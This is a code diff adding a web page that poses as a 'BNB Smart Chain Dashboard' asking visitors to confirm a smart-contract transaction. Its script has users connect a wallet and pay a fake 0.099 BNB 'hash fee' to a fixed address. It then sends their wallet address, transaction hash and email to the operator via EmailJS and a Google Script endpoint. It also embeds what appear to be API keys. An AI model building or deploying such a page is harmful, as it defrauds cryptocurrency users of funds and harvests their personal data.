@@ -1,0 +1,180 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>BNB Smart Chain Dashboard</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.3/dist/ethers.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #212529;
+    }
+    .container {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+    }
+    h1 {
+      color: #007bff;
+      margin-bottom: 10px;
+    }
+    .hidden {
+      display: none;
+    }
+    .btn {
+      background-color: #007bff;
+      color: white;
+      padding: 10px 20px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .btn:hover {
+      background-color: #0056b3;
+    }
+    .address-box {
+      font-family: monospace;
+      background-color: #f1f3f5;
+      padding: 10px;
+      margin: 15px 0;
+      border-radius: 5px;
+    }
+    .qr {
+      margin: 10px 0;
+      width: 180px;
+      border-radius: 5px;
+    }
+    .link {
+      display: block;
+      margin-bottom: 15px;
+      color: #007bff;
+      text-decoration: none;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .status {
+      margin-top: 10px;
+      font-size: 14px;
+      color: #6c757d;
+    }
+    input[type=email] {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ced4da;
+      border-radius: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="page1">
+    <h1>BNB Dashboard</h1>
+    <p>Confirm your smart contract transaction</p>
+    <input type="email" id="userEmail" placeholder="Enter email (optional)" />
+    <div id="walletStatus">🔌 Not connected</div>
+    <button class="btn" onclick="connectWallet()">Connect Wallet</button>
+    <button class="btn" onclick="switchPage('page2')">Confirm Contract Transaction</button>
+  </div>  <div class="container hidden" id="page2">
+    <h1>Authorize Transaction</h1>
+    <p>Your transaction is being authorized on the blockchain.</p>
+    <button class="btn" onclick="switchPage('page3')">Confirm: OpBNB Transaction</button>
+  </div>  <div class="container hidden" id="page3">
+    <h1>Confirm Payment</h1>
+    <p>Top up hash fee: <strong>0.099 BNB</strong></p>
+    <div class="address-box" id="targetAddress">0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</div>
+    <a class="link" href="https://bscscan.com/address/0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" target="_blank">🔍 View on BscScan</a>
+    <img class="qr" src="https://chart.googleapis.com/chart?cht=qr&chs=200x200&chl=0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69" alt="QR Code" />
+    <button class="btn" onclick="sendTransaction()">✅ Send Transaction</button>
+    <div id="status" class="status"></div>
+  </div>  <div class="container hidden" id="successPage">
+    <h1>✅ Success</h1>
+    <p>Transaction sent successfully. You’ll be redirected.</p>
+  </div>  <div class="container hidden" id="failPage">
+    <h1>❌ Failed</h1>
+    <p>Transaction failed. Please try again.</p>
+    <button class="btn" onclick="switchPage('page1')">🔁 Retry</button>
+  </div>  <script>
+    const targetAddress = "0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69";
+    const emailService = "service_78wwbgl";
+    const templateID = "template_omkmcio";
+    const publicKey = "ochPV1QVtay7TOdBA";
+    const sheetUrl = "YOUR_GOOGLE_SCRIPT_URL_HERE";
+    const BSCSCAN_API_URL = "https://api.bscscan.com/api";
+    const BSCSCAN_API_KEY = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+
+    let signer, userAddress;
+
+    function switchPage(id) {
+      document.querySelectorAll(".container").forEach(div => div.classList.add("hidden"));
+      document.getElementById(id).classList.remove("hidden");
+    }
+
+    async function connectWallet() {
+      if (!window.ethereum) return alert("Please install MetaMask.");
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        signer = await provider.getSigner();
+        userAddress = await signer.getAddress();
+        document.getElementById("walletStatus").innerText = `✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
+      } catch (err) {
+        alert("Wallet connection failed.");
+      }
+    }
+
+    async function sendTransaction() {
+      const status = document.getElementById("status");
+      status.innerText = "⏳ Sending transaction...";
+      try {
+        const tx = await signer.sendTransaction({ to: targetAddress, value: ethers.parseEther("0.099") });
+
+        emailjs.init(publicKey);
+        const email = document.getElementById("userEmail").value || "N/A";
+        await emailjs.send(emailService, templateID, {
+          user_wallet: userAddress,
+          tx_hash: tx.hash,
+          to_address: targetAddress,
+          email: email,
+          message: "Transaction sent successfully"
+        });
+
+        await fetch(sheetUrl, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({ user_wallet: userAddress, tx_hash: tx.hash, email, to_address: targetAddress })
+        });
+
+        // Optional BscScan TX Status check
+        const txCheck = await fetch(`${BSCSCAN_API_URL}?module=transaction&action=gettxreceiptstatus&txhash=${tx.hash}&apikey=${BSCSCAN_API_KEY}`);
+        const result = await txCheck.json();
+        if (result.status === "1" && result.result.status === "1") {
+          switchPage("successPage");
+          setTimeout(() => switchPage("page1"), 6000);
+        } else {
+          throw new Error("Transaction failed on-chain.");
+        }
+      } catch (err) {
+        console.error(err);
+        switchPage("failPage");
+      } finally {
+        status.innerText = "";
+      }
+    }
+  </script>
+</body>
+</html>
